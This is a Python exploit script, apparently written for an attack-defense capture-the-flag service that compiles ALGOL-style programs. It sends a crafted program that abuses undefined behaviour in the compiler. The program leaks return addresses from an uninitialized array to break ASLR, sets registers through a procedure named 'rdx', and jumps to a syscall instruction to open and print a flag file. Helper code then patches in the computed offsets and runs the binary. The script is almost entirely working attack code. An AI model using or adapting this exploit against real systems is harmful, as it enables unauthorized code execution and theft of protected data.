import utils

utils.PATCH_RODATA_OR_RECOMPILE = True

# Use register name (rax,rdi...) as function name, as this will lead to register call with assembly intel syntax.
# To create an exploit you need some undefined behavior to break ASLR and some way to set specific registers.
# This exploit expects compiler not overriding stackframe with uninitialized local variables.
# This exploit expected rax not being overwritten after integer divison.
# This exploit expects the compiler using standard calling convention.

# Define the "rdx" function that will result in a register call.
# Also with 3 arguments to set the registers rdi, rsi, rdx as per calling convention.
# Call function "add" that does a bit of recursion.
# Then in main scan the uninitialized "arr" for binary addresses (>0x7f0000000000).
# Try to find a dupplicate one, which should be the recusive return addr.
# Then make a integer divison to get 2 into rax.
# Then call the rdx "function" setting rdx to the syscall instruction and rsi and rdi for the open syscall.
exploit_code = f"""
'BEGIN'
  'INTEGER' 'PROCEDURE' rdx(rdi,rsi,dx);
    'INTEGER' rdi,rsi,dx;
    rdx := rdi+rsi+dx;

  'INTEGER' 'PROCEDURE' add(n);
    'INTEGER' n;
    add := 'IF' n > 0 'THEN' add(n-1) + 1 'ELSE' 0;

  'INTEGER' 'PROCEDURE' main;
    'INTEGER' 'ARRAY' arr[16];
    'INTEGER' i, lastAddr;
  'BEGIN'
    lastAddr := 0;
    'FOR' i := 0 'STEP' 1 'UNTIL' 15 'DO'
      'IF' arr[i] > {0x7f0000000000} 'THEN' 'BEGIN'
        'IF' arr[i] = lastAddr 'THEN'
          i := 16
        'ELSE'
          lastAddr := arr[i];
      'END';

    aOne := 2 รท aOne;
    main := rdx(lastAddr + %d, 0, lastAddr + %d);
  'END';

  'INTEGER' aOne, fd;
  aOne := 1;

  aOne := add(8) - 7;
  fd := main;
  outstring(readstring(fd));
  outchar(10);
  outstring("%s");
'END'
"""

# mustn't be larger 2 ** 63 - 1
pattern1 = 0x3F3F3F3F3F3F3F3F
pattern2 = 0x6F6F6F6F6F6F6F6F

def main(host, flag_id):
    # compile code with patterns for the offset constants
    code = exploit_code % (pattern1, pattern2, flag_id)
    json, elf = utils.compileCode(host, code)

    # get value of recusive return address in add
    addRetAdddr = utils.getOffsetForReturnFromFirstCall(elf, "add")
    print("addRetAdddr", hex(addRetAdddr))

    # find the syscall instr in openWOConfidential
    syscall_off = utils.findSyscallInOpenWOConfidential(elf)
    print("syscall_off", hex(syscall_off))

    # find flagId in strings
    flagId_off = utils.findInStrings(elf, flag_id.encode())
    print("flagId_off", hex(flagId_off))

    # patch rodata or recompile
    json = utils.replacePatternWith(host, json, elf, code, replacements=[
        # pattern1 is the offset from addRetAdddr to flagId
        (pattern1, flagId_off - addRetAdddr),
        # pattern2 is the offset from addRetAdddr to syscall
        (pattern2, syscall_off - addRetAdddr)
    ])

    # execute binary
    stdout = utils.executeAndRetStdout(host, json)
    print(stdout)


utils.launchExploit(main)
